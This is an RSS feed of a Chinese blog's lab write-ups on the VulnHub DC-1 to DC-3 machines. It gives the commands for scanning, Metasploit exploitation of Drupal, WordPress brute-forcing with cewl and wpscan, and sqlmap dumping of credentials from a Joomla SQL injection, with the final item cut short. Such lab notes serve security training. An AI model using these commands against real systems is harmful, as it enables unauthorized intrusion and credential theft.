<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>DC on mrlxl的知识库</title>
    <link>https://yuy0ung.github.io/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/</link>
    <description>Recent content in DC on mrlxl的知识库</description>
    <generator>Hugo</generator>
    <language>en-US</language>
    <lastBuildDate>Thu, 11 Dec 2025 00:00:00 +0800</lastBuildDate>
    <atom:link href="https://yuy0ung.github.io/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>DC-1渗透笔记</title>
      <link>https://yuy0ung.github.io/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-1%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</link>
      <pubDate>Thu, 11 Dec 2025 00:00:00 +0800</pubDate>
      <guid>https://yuy0ung.github.io/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-1%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</guid>
      <description>&lt;h1 id=&#34;dc-1渗透笔记&#34;&gt;DC-1渗透笔记&lt;/h1&gt;&#xA;&lt;h3 id=&#34;信息搜集&#34;&gt;信息搜集&lt;/h3&gt;&#xA;&lt;h4 id=&#34;探测ip&#34;&gt;探测IP&lt;/h4&gt;&#xA;&lt;p&gt;nmap扫一下：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nmap -sP 192.168.111.0/24&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;发现IP为192.168.111.143&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714162840459-228848118.png&#34; alt=&#34;image-20240714162839220&#34;&gt;&lt;/p&gt;&#xA;&lt;h4 id=&#34;端口探测&#34;&gt;端口探测&lt;/h4&gt;&#xA;&lt;p&gt;nmap扫描所有端口的信息：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nmap -sV -p- 192.168.111.143&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可以看见开放了：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;22端口&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;80端口&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;111端口&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;49525端口&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714164616741-778751171.png&#34; alt=&#34;image-20240714164615492&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;这里80端口和22端口可能比较重要，我先从80端口的web服务入手&lt;/p&gt;&#xA;&lt;h4 id=&#34;网页信息搜集&#34;&gt;网页信息搜集&lt;/h4&gt;&#xA;&lt;p&gt;浏览器访问80端口：&lt;/p&gt;&#xA;&lt;p&gt;需要登录，没什么头绪，再看看有没有其他利用点&lt;/p&gt;&#xA;&lt;p&gt;用wappalyzer可以看见cms、语言、中间件、操作系统等基本信息：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Drupal 7&lt;/li&gt;&#xA;&lt;li&gt;PHP 5.4.45&lt;/li&gt;&#xA;&lt;li&gt;Apache 2.2.22&lt;/li&gt;&#xA;&lt;li&gt;debian&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714165723964-1878336182.png&#34; alt=&#34;image-20240714165722492&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;跑一下目录看看：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dirsearch -u 192.168.111.143&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;扫到很多目录但是作用不是很大&lt;/p&gt;&#xA;&lt;h3 id=&#34;漏洞利用&#34;&gt;漏洞利用&lt;/h3&gt;&#xA;&lt;p&gt;首先从cms入手看看有没有历史漏洞，搜索一下还真有个18年的CVE&lt;/p&gt;&#xA;&lt;p&gt;直接上msf看看有没有现成的脚本：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;search Drupal&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714172700055-106846141.png&#34; alt=&#34;image-20240714172659056&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;应该就是18年那个了，use一下，填好参数直接开打：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714173203401-1947708441.png&#34; alt=&#34;image-20240714173202094&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;这就拿shell了，好快&lt;/p&gt;&#xA;&lt;h3 id=&#34;后渗透&#34;&gt;后渗透&lt;/h3&gt;&#xA;&lt;h4 id=&#34;获取交互式shellflag1flag2&#34;&gt;获取交互式shell（flag1、flag2）&lt;/h4&gt;&#xA;&lt;p&gt;输入shell即可进入linux的shell，就是有点丑&lt;/p&gt;&#xA;&lt;p&gt;老规矩，试试用python获取一个pty&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;OK了，看来是装了python的：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714173636356-73390313.png&#34; alt=&#34;image-20240714173635145&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;这里有个flag1.txt，cat一下：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714173734168-311523890.png&#34; alt=&#34;image-20240714173733254&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;翻译一下：&lt;strong&gt;每个好的CMS都需要一个配置文件，你也一样&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;那这里就是告诉我下一步得去看这个drupal cms的配置文件了&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714174418899-1582315866.png&#34; alt=&#34;image-20240714174418093&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;看看有没有settings.php：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714174548416-1321432277.png&#34; alt=&#34;image-20240714174547677&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;还真是，直接cat看看：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714174722058-124470931.png&#34; alt=&#34;image-20240714174720977&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;这里获得了flag2：&lt;strong&gt;暴力破解和字典攻击并不是获取访问权限（而你肯定需要访问权限）的唯一方式。有了这些凭证，你能做什么？&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;而下面还给出了mysql数据库的账密，很明显下一步要进数据库了&lt;/p&gt;</description>
    </item>
    <item>
      <title>DC-2渗透笔记</title>
      <link>https://yuy0ung.github.io/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-2%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</link>
      <pubDate>Thu, 11 Dec 2025 00:00:00 +0800</pubDate>
      <guid>https://yuy0ung.github.io/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-2%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</guid>
      <description>&lt;h1 id=&#34;vulnhub-dc2渗透笔记&#34;&gt;vulnhub-DC:2渗透笔记&lt;/h1&gt;&#xA;&lt;h3 id=&#34;信息搜集&#34;&gt;信息搜集&lt;/h3&gt;&#xA;&lt;h4 id=&#34;ip探测&#34;&gt;IP探测&lt;/h4&gt;&#xA;&lt;p&gt;老规矩，先探测一下IP：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nmap -sP 192.168.111.0/24&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240715161831122-910763766.png&#34; alt=&#34;image-20240715161830565&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;确定IP为192.168.111.144&lt;/p&gt;&#xA;&lt;h4 id=&#34;端口探测&#34;&gt;端口探测&lt;/h4&gt;&#xA;&lt;p&gt;看看开了哪些端口：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nmap -sV -p- 192.168.111.144&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240715162050650-443741704.png&#34; alt=&#34;image-20240715162050242&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;可以看到开放了两个端口：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;80端口，这个应该就是web服务&lt;/li&gt;&#xA;&lt;li&gt;7744端口，似乎是把ssh服务默认的22改成了7744&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 id=&#34;网页信息收集&#34;&gt;网页信息收集&lt;/h4&gt;&#xA;&lt;p&gt;浏览器访问80端口看看：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240715162402515-2105706616.png&#34; alt=&#34;image-20240715162402283&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;不能访问，但显示了个dc-2，这里涉及一个dns解析顺序的问题：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;根据Windows系统规定，在进行DNS请求以前，Windows系统会先检查自己的Hosts文件中是否有这个地址映射关系，如果有则调用这个IP地址映射，如果没有再向已知的DNS服务器提出域名解析。 也就是说Hosts的请求级别比DNS高&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;所以我们修改C:/Windows/System32/drivers/etc/HOSTS文件进行host碰撞：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240715162708133-71093939.png&#34; alt=&#34;image-20240715162707796&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;ok现在再访问一下进入web服务：&lt;/p&gt;&#xA;&lt;p&gt;可以访问了且发现了flag1：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;你通常使用的字典可能行不通，所以也许你需要使用cewl。&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;更多的密码总是更好，但有时你就是无法赢得所有的。&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;登录为一个用户来查看下一个flag&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;如果找不到它，尝试以另一个身份登录&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;他这里应该是让我使用cewl进行密码攻击，但并不代表只有这种方法，我们接着看看&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240715162829194-1231726177.png&#34; alt=&#34;image-20240715162827987&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;依旧是通过wappalyzer得到web服务的基本信息：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;wordpress 4.7.10&lt;/li&gt;&#xA;&lt;li&gt;php语言&lt;/li&gt;&#xA;&lt;li&gt;Apache&lt;/li&gt;&#xA;&lt;li&gt;debian系统&lt;/li&gt;&#xA;&lt;li&gt;mysql数据库&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;还是dirsearch扫一扫目录：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240715173517979-1403181923.png&#34; alt=&#34;image-20240715173517298&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;没有什么特别有用的信息&lt;/p&gt;&#xA;&lt;h3 id=&#34;漏洞利用&#34;&gt;漏洞利用&lt;/h3&gt;&#xA;&lt;h4 id=&#34;wordpressflag1flag2&#34;&gt;wordpress（flag1、flag2）&lt;/h4&gt;&#xA;&lt;p&gt;根据提示使用kali自带的cewl生成密码字典：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cewl http://dc-2/ -w dict.txt&#x9;&#x9;&#x9;//保存在dict.txt中&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个txt作为我们后续爆破用的字典&lt;/p&gt;&#xA;&lt;p&gt;接下来按照flag1的提示，是要进行登录，针对wordpress一般可以试试wpscan：&lt;/p&gt;&#xA;&lt;p&gt;用wpscan枚举一下用户名&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wpscan --url http://dc-2/ --enumerate u&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240715175238466-791836176.png&#34; alt=&#34;image-20240715175237833&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;发现三个用户名，我们同样将他们保存至user.txt&lt;/p&gt;&#xA;&lt;p&gt;接下来是针对用户的密码爆破，用户名和密码的字典指定为我们保存的字典：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wpscan --url http://dc-2/ -U user.txt -P dict.txt&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240715175814875-460633213.png&#34; alt=&#34;image-20240715175814731&#34; style=&#34;zoom:150%;&#34; /&gt;&#xA;&lt;p&gt;可以看见，jerry和tom的密码都被爆破出来了，让我们登录试试&lt;/p&gt;</description>
    </item>
    <item>
      <title>DC-3渗透笔记</title>
      <link>https://yuy0ung.github.io/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-3%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</link>
      <pubDate>Thu, 11 Dec 2025 00:00:00 +0800</pubDate>
      <guid>https://yuy0ung.github.io/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-3%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</guid>
      <description>&lt;h1 id=&#34;dc-32渗透笔记&#34;&gt;DC-3.2渗透笔记&lt;/h1&gt;&#xA;&lt;h3 id=&#34;信息搜集&#34;&gt;信息搜集&lt;/h3&gt;&#xA;&lt;h4 id=&#34;ip探测&#34;&gt;IP探测&lt;/h4&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719222613779-2127021338.png&#34; alt=&#34;image-20240719222612552&#34;&gt;&lt;/p&gt;&#xA;&lt;h4 id=&#34;端口探测&#34;&gt;端口探测&lt;/h4&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719222809211-1287523617.png&#34; alt=&#34;image-20240719222808591&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;发现只有80端口开启，那就直接看看web服务&lt;/p&gt;&#xA;&lt;h4 id=&#34;网页信息搜集&#34;&gt;网页信息搜集&lt;/h4&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719222935277-1864423034.png&#34; alt=&#34;image-20240719222934704&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;这里最重要的信息就是这个cms模板是joomla&lt;/p&gt;&#xA;&lt;p&gt;扫一下目录：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719223358196-893440691.png&#34; alt=&#34;image-20240719223357055&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;可以发现/administrator/是后台：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719224121795-503912048.png&#34; alt=&#34;image-20240719224120841&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在README.txt中记录了版本号为3.7&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719223919517-470503049.png&#34; alt=&#34;image-20240719223918908&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;查一下有没有漏洞：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719224330563-745610616.png&#34; alt=&#34;image-20240719224330088&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;ok存在sql注入，准备利用&lt;/p&gt;&#xA;&lt;h3 id=&#34;漏洞利用&#34;&gt;漏洞利用&lt;/h3&gt;&#xA;&lt;h4 id=&#34;sql注入&#34;&gt;SQL注入&lt;/h4&gt;&#xA;&lt;h5 id=&#34;方法一sqlmap&#34;&gt;方法一：sqlmap&lt;/h5&gt;&#xA;&lt;p&gt;看看漏洞细节描述：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719225235892-731594601.png&#34; alt=&#34;image-20240719225234632&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;还是个CVE，这里连sqlmap的命令都给出来了，直接跑一手sqlmap&lt;/p&gt;&#xA;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719231458361-308146630.png&#34; alt=&#34;image-20240719231457682&#34; style=&#34;zoom:150%;&#34; /&gt;&#xA;&lt;p&gt;跑出来5个数据库，再按常规流程梭一下：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;爆当前库名：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sqlmap -u &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://192.168.40.159/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml&amp;#34;&lt;/span&gt; --risk&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; --level&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; --random-agent -p list&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;fullordering&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; --current-db&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719231658621-171644524.png&#34; alt=&#34;image-20240719231658067&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;库名为joomladb&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;爆表名：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sqlmap -u &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://192.168.111.191/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml&amp;#34;&lt;/span&gt; --risk&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; -p list&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;fullordering&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; -D &lt;span class=&#34;s2&#34;&gt;&amp;#34;joomladb&amp;#34;&lt;/span&gt; --tables&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719232002530-1813592869.png&#34; alt=&#34;image-20240719232001836&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;一共76张表，#__users 这个表一看就很有用，看看&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;爆列名：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sqlmap -u &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://192.168.111.191/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml&amp;#34;&lt;/span&gt; --risk&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; -p list&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;fullordering&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; -D &lt;span class=&#34;s2&#34;&gt;&amp;#34;joomladb&amp;#34;&lt;/span&gt; --tables -T &lt;span class=&#34;s2&#34;&gt;&amp;#34;#__users&amp;#34;&lt;/span&gt; --columns&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719233206908-110360921.png&#34; alt=&#34;image-20240719233206369&#34;&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;接下来爆username和password字段：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sqlmap -u &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://192.168.111.191/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml&amp;#34;&lt;/span&gt; --risk&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; -p list&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;fullordering&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; -D &lt;span class=&#34;s2&#34;&gt;&amp;#34;joomladb&amp;#34;&lt;/span&gt; --tables -T &lt;span class=&#34;s2&#34;&gt;&amp;#34;#__users&amp;#34;&lt;/span&gt; --columns -C &lt;span class=&#34;s2&#34;&gt;&amp;#34;username,password&amp;#34;&lt;/span&gt; --dump&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719234300072-1065656106.png&#34; alt=&#34;image-20240719234259313&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>DC-4渗透笔记</title>
      <link>https://yuy0ung.github.io/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-4%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</link>
      <pubDate>Thu, 11 Dec 2025 00:00:00 +0800</pubDate>
      <guid>https://yuy0ung.github.io/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-4%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</guid>
